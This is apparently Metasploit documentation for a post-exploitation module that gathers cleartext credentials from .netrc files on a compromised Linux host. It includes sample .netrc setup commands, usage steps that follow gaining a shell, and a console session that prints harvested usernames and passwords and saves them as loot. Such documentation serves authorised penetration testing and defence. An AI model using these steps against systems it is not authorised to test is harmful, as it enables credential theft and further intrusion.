## Vulnerable Application

Post module to obtain credentials saved for FTP and other services
in `.netrc`

This file is kept in user's home directories to configure various services,
such as curl, but contains cleartext credentials.

### Example netrc file

Example documentation can be found in the curl docs on netrc:
https://everything.curl.dev/usingcurl/netrc

```
echo "machine example.com login daniel password qwerty" > ~/.netrc
echo "machine example2.com" >> ~/.netrc
echo "login daniel2" >> ~/.netrc
echo "password qwerty2" >> ~/.netrc
```

## Verification Steps

1. Start msfconsole
1. Get a shell on a system
1. Do: `use post/multi/gather/netrc_creds`
1. Do: `set session [session]`
1. Do: `run`
1. If any `.netrc` files exist with credentials, they will be read and stored into a loot file.

## Options

## Scenarios

### Ubuntu 22.04.01

```
msf6 auxiliary(scanner/ssh/ssh_login) > sessions -l

Active sessions
===============

  Id  Name  Type         Information   Connection
  --  ----  ----         -----------   ----------
  1         shell linux  SSH ubuntu @  2.2.2.2:39857 -> 1.1.1.1:22 (1.1.1.1)

msf6 auxiliary(scanner/ssh/ssh_login) > use post/multi/gather/netrc_creds
msf6 post(multi/gather/netrc_creds) > set session 1
session => 1
msf6 post(multi/gather/netrc_creds) > run

[*] Reading: /bin/.netrc
[*] Reading: /dev/.netrc
[*] Reading: /home/syslog/.netrc
[*] Reading: /home/ubuntu/.netrc
[*] Reading: /nonexistent/.netrc
[*] Reading: /root/.netrc
[*] Reading: /run/ircd/.netrc
[*] Reading: /run/sshd/.netrc
[*] Reading: /run/systemd/.netrc
[*] Reading: /run/uuidd/.netrc
[*] Reading: /usr/games/.netrc
[*] Reading: /usr/sbin/.netrc
[*] Reading: /var/backups/.netrc
[*] Reading: /var/cache/man/.netrc
[*] Reading: /var/cache/pollinate/.netrc
[*] Reading: /var/lib/gnats/.netrc
[*] Reading: /var/lib/landscape/.netrc
[*] Reading: /var/lib/tpm/.netrc
[*] Reading: /var/lib/usbmux/.netrc
[*] Reading: /var/list/.netrc
[*] Reading: /var/mail/.netrc
[*] Reading: /var/snap/lxd/common/lxd/.netrc
[*] Reading: /var/spool/lpd/.netrc
[*] Reading: /var/spool/news/.netrc
[*] Reading: /var/spool/uucp/.netrc
[*] Reading: /var/www/.netrc

.netrc credentials
==================

 Username  Password  Server
 --------  --------  ------
 daniel    qwerty    example.com
 daniel2   qwerty2   example2.com

[*] Credentials stored in: /root/.msf4/loot/20221008103946_default_1.1.1.1_netrc.creds_551386.txt
[*] Post module execution completed
```
